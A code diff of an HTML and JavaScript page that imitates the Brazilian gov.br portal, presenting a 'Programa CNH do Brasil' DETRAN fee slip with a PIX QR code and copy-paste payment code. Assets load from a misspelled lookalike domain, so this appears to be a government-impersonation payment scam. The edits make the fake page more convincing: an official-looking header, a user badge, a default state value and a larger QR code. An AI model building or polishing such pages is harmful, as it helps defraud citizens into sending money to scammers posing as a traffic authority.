@@ -14,31 +14,50 @@
     }
     main.flex-1 { min-height: 100vh; }
     header.govbr {
-      background: #f7f7f7;
+      background: #ffffff;
       border-bottom: 1px solid #e5e7eb;
     }
     .govbr-top {
-      background: #ffffff;
-      border-bottom: 1px solid #e5e7eb;
       padding: 10px 16px;
       display: flex;
       align-items: center;
-      gap: 12px;
+      justify-content: space-between;
+      border-bottom: 1px solid #e5e7eb;
     }
     .govbr-logo {
       font-weight: 700;
       color: #0b3d91;
       font-size: 18px;
     }
+    .govbr-icons { display: flex; align-items: center; gap: 12px; color: #6b7280; }
+    .govbr-icon {
+      width: 18px;
+      height: 18px;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .govbr-user {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      background: #1e40af;
+      color: #ffffff;
+      padding: 6px 10px;
+      border-radius: 18px;
+      font-size: 12px;
+      font-weight: 600;
+    }
     .govbr-bar {
       display: flex;
       align-items: center;
-      gap: 12px;
+      gap: 10px;
       padding: 10px 16px;
       color: #374151;
+      background: #f9fafb;
     }
     .govbr-title {
-      font-size: 15px;
+      font-size: 14px;
       font-weight: 500;
     }
     .flex-1 { flex: 1 1 0%; }
@@ -112,6 +131,8 @@
     .h-5 { height: 1.25rem; }
     .w-48 { width: 12rem; }
     .h-48 { height: 12rem; }
+    .w-56 { width: 14rem; }
+    .h-56 { height: 14rem; }
     .h-16 { height: 4rem; }
     .max-w-\[200px\] { max-width: 200px; }
     .object-contain { object-fit: contain; }
@@ -147,10 +168,17 @@
   <header class="govbr">
     <div class="govbr-top">
       <div class="govbr-logo">gov.br</div>
+      <div class="govbr-icons">
+        <span class="govbr-icon">⋮</span>
+        <span class="govbr-icon">◔</span>
+        <span class="govbr-icon">▦</span>
+        <span class="govbr-user">👤 Juan</span>
+      </div>
     </div>
     <div class="govbr-bar">
       <span>☰</span>
       <span class="govbr-title">Programa CNH do Brasil</span>
+      <span style="margin-left:auto;">🔍</span>
     </div>
   </header>
 
@@ -228,7 +256,7 @@
           </div>
           <div class="bg-white p-3 rounded border border-gray-300 mb-3 flex flex-col items-center">
             <p class="text-xs text-gray-500 mb-2">QR CODE PIX:</p>
-            <img id="qr" alt="QR Code PIX" class="w-48 h-48 object-contain" />
+            <img id="qr" alt="QR Code PIX" class="w-56 h-56 object-contain" />
           </div>
           <div class="bg-white p-3 rounded border border-gray-300 mb-3">
             <p class="text-xs text-gray-500 mb-1">CÓDIGO PIX COPIA E COLA:</p>
@@ -283,7 +311,7 @@
 
     const detranLogoBase = "https://assets.pogramasenatran.org/detran/";
 
-    const detranUf = (data.uf || data.detran || "").replace("DETRAN/", "").trim().toUpperCase();
+    const detranUf = (data.uf || data.detran || "AC").replace("DETRAN/", "").trim().toUpperCase();
     const detranLabel = detranUf ? `DETRAN/${detranUf}` : "DETRAN";
     document.getElementById("detran-title").textContent = `${detranLabel} - GUIA DE RECOLHIMENTO`;
     document.getElementById("pix-title").textContent = `${detranLabel} - PAGAMENTO VIA PIX`;
@@ -351,14 +379,9 @@
       }
       document.getElementById("pix-code").textContent = json.pix_code || "";
       const qrImg = document.getElementById("qr");
-      const qrUrl = json.pix_qr_code || json.qr_code || "";
-      if (qrUrl && (qrUrl.startsWith("http") || qrUrl.startsWith("data:"))) {
-        qrImg.src = qrUrl;
-        return;
-      }
-      const pixText = json.pix_code || "";
+      const pixText = (json.pix_code || "").replace(/\s+/g, "");
       if (pixText) {
-        const qr = await QRCode.toDataURL(pixText, { width: 180, margin: 1 });
+        const qr = await QRCode.toDataURL(pixText, { width: 240, margin: 1 });
         qrImg.src = qr;
       }
     }
